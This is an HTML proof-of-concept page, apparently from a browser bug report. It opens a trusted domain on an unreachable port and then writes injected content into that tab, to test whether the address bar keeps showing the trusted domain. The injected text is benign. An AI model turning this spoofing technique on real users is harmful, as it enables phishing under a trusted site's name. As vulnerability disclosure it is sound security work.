<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Navigation State Test</title>

<style>
body{
  font-family:Arial;
  text-align:center;
  margin-top:120px;
}

button{
  padding:14px 28px;
  font-size:18px;
}

#log{
  margin-top:30px;
  color:#555;
}
</style>
</head>

<body>

<h2>Navigation State Desync Test</h2>

<button onclick="start()">Start Test</button>

<div id="log"></div>

<script>

function log(msg){
  document.getElementById("log").innerHTML += msg + "<br>";
}

function start(){

  log("Opening new tab with unreachable port...");

  // open trusted domain with closed port
  let win = window.open("https://bugzilla.mozilla.org:90");

  setTimeout(()=>{

    log("Attempting document injection...");

    try{

      win.document.open();
      win.document.write(`
        <html>
        <body style="font-family:Arial;text-align:center;margin-top:100px;">
        <h2>Navigation Test Page</h2>
        <p>This content was injected after a failed navigation.</p>
        <p>If the address bar still shows the original domain, this demonstrates a navigation state issue.</p>
        </body>
        </html>
      `);
      win.document.close();

      log("Document injected.");

    }catch(e){

      log("Injection blocked by browser security.");

    }

  },2000);

}

</script>

</body>
</html>
